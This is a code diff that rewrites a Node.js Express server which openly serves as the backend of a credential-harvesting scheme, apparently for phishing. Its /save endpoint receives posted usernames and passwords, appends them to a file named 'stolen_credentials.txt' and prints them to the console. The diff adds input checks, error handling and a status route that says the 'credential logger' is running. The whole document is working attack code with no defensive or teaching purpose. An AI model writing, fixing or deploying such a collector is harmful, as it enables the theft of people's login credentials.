@@ -1,41 +1,39 @@
 const express = require('express');
 const fs = require('fs');
+const path = require('path');
+
 const app = express();
-const port = process.env.PORT || 3000;
+const PORT = process.env.PORT || 3000;
+const HOST = '0.0.0.0';
 
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-app.post('/save', (req, res) => {
-    const { username, password, timestamp } = req.body;
-    const log = `${timestamp} | Username: ${username} | Password: ${password}\n`;
-    
-    fs.appendFile('stolen_credentials.txt', log, (err) => {
-        if (err) console.error('Error writing file:', err);
-    });
-    
-    res.send('OK');
+// Test route - open this in browser to check if backend is alive
+app.get('/', (req, res) => {
+    res.send('✅ Credential logger backend is running!');
 });
 
-app.listen(port, () => {
-    console.log(`Backend running on port ${port}`);
-});const express = require('express');
-const fs = require('fs');
-const app = express();
-const port = process.env.PORT || 3000;
-
-app.use(express.json());
-
 app.post('/save', (req, res) => {
-    const { username, password, timestamp } = req.body;
-    const log = `${timestamp} | Username: ${username} | Password: ${password}\n`;
-    
-    fs.appendFile('stolen_credentials.txt', log, (err) => {
-        if (err) console.error('Error writing file:', err);
-    });
-    
-    res.send('OK');
+    try {
+        const { username, password, timestamp } = req.body;
+
+        if (!username || !password) {
+            return res.status(400).send('Missing data');
+        }
+
+        const logEntry = `${timestamp || new Date().toISOString()} | Username: ${username} | Password: ${password}\n`;
+
+        fs.appendFileSync('stolen_credentials.txt', logEntry);
+
+        console.log('✅ Credentials saved:', logEntry.trim());
+        res.send('OK');
+    } catch (error) {
+        console.error('Error:', error);
+        res.status(500).send('Server error');
+    }
 });
 
-app.listen(port, () => {
-    console.log(`Backend running on port ${port}`);
+app.listen(PORT, HOST, () => {
+    console.log(`🚀 Backend running on http://${HOST}:${PORT}`);
 });
